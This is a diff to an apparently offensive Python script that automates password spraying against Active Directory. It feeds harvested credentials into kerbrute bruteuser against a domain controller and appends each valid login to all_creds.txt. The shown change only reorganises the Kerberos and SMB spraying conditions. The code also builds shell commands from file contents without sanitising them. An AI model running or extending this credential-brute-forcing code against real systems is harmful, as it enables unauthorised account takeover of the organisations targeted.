@@ -615,44 +615,49 @@ contenu=[]
 if os.path.isfile(f'valid_users.txt') and krb and not smb:
 	with open("valid_users.txt") as fichier:
 		contenu=fichier.readlines()
-	printf(" trying user as pass (Kerberos) and password spraying",green)
-	with open("all_creds.txt","r") as fi:
-		co=fi.readlines()
-	#print(co)
-	os.system("cp valid_users.txt valid_users_and_pass.txt")
-	for p in co:
-		if p !=("\n"):
-			p=p.replace("\n","")
-			os.system(f"echo {p.split(':')[1]} >> valid_users_and_pass.txt")
-	#print(contenu)
-	for user in contenu:
-		user=user.replace("\n","")
-		#print(user)
-		os.system(f"kerbrute bruteuser --dc {ip_to_scan} -d {domain_name} valid_users_and_pass.txt {user} -v | grep 'VALID' | tee kerbrute_{user}_tmp.txt")
-		os.system(f"cat kerbrute_{user}_tmp.txt  | grep 'VALID' 2>/dev/null > creds_{user}.txt; rm kerbrute_{user}_tmp.txt ")
-		#exit()
-		with open(f"creds_{user}.txt","r") as fichier:
-				contenu2=fichier.readlines()
-		if  len(contenu2) !=0:
-			#print("")
-			with open("all_creds.txt","r+") as fichier2:
-				contenu_all_creds=fichier2.readlines()
-				#print(contenu_all_creds)
-				#print(contenu)
-
-				for item in contenu2:
-					cred=kerbrute_bruteuser_cred_extract(item)
-					print(yellow+cred+white+"	(added to all_creds.txt)")
+	if len(contenu) !=0:
+		printf(" trying user as pass (Kerberos) and password spraying",green)
+		with open("all_creds.txt","r") as fi:
+			co=fi.readlines()
+		#print(co)
+		os.system("cp valid_users.txt valid_users_and_pass.txt")
+		for p in co:
+			if p !=("\n"):
+				p=p.replace("\n","")
+				os.system(f"echo {p.split(':')[1]} >> valid_users_and_pass.txt")
+		#print(contenu)
+		for user in contenu:
+			user=user.replace("\n","")
+			#print(user)
+			os.system(f"kerbrute bruteuser --dc {ip_to_scan} -d {domain_name} valid_users_and_pass.txt {user} -v | grep 'VALID' | tee kerbrute_{user}_tmp.txt")
+			os.system(f"cat kerbrute_{user}_tmp.txt  | grep 'VALID' 2>/dev/null > creds_{user}.txt; rm kerbrute_{user}_tmp.txt ")
+			#exit()
+			with open(f"creds_{user}.txt","r") as fichier:
+					contenu2=fichier.readlines()
+			if  len(contenu2) !=0:
+				#print("")
+				with open("all_creds.txt","r+") as fichier2:
+					contenu_all_creds=fichier2.readlines()
 					#print(contenu_all_creds)
-					if (cred+"\n") not in contenu_all_creds:	
-						os.system(f"echo '{cred}' >> all_creds.txt")
+					#print(contenu)
 
+					for item in contenu2:
+						cred=kerbrute_bruteuser_cred_extract(item)
+						print(yellow+cred+white+"	(added to all_creds.txt)")
+						#print(contenu_all_creds)
+						if (cred+"\n") not in contenu_all_creds:	
+							os.system(f"echo '{cred}' >> all_creds.txt")
+
+con=[]
 contenu=[]
 if os.path.isfile(f'all_creds.txt'):
 	with open("all_creds.txt","r") as fichier:
 		contenu=fichier.readlines()
+if os.path.isfile(f'valid_users.txt') and krb and not smb:
+	with open("valid_users.txt") as fr:
+		con=fr.readlines()
 
-if len(contenu) !=0 and smb:
+if smb and len(con) !=0:
 	printf(" trying user as pass (SMB) and password spraying (could take a while...)",green)
 	with open("all_creds.txt","r") as fi:
 		co=fi.readlines()
